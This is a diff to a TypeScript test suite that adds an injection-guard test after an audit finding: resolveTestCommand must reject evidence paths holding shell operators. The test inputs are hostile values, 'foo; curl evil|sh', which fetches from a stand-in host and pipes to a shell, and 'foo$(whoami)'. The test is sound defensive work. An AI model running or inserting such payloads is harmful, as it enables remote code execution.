@@ -82,6 +82,16 @@ describe("resolveTestCommand — pure command resolver (Req3 AC3)", () => {
     const cmd = resolveTestCommand("unit", cfg, "test/foo.test.ts");
     expect(cmd).toContain("test/foo.test.ts");
   });
+
+  // Audit P3-latent-B (2026-07-16): evidencePath is extracted from a
+  // scenario's Evidence: line and spliced onto the test command. It must be a
+  // path, never shell operators. Although the delegate runner is currently
+  // dead code, refuse metacharacters now so re-wiring can't activate the
+  // injection (SR-2).
+  it("rejects an evidencePath containing shell operators (injection guard)", () => {
+    expect(() => resolveTestCommand("unit", cfg, "foo; curl evil|sh")).toThrow(/meta|inject|shell|unsafe|path/i);
+    expect(() => resolveTestCommand("unit", cfg, "foo$(whoami)")).toThrow(/meta|inject|shell|unsafe|path/i);
+  });
 });
 
 describe("checkContractFresh — Contract-Source freshness (Req3 AC7, AC8)", () => {
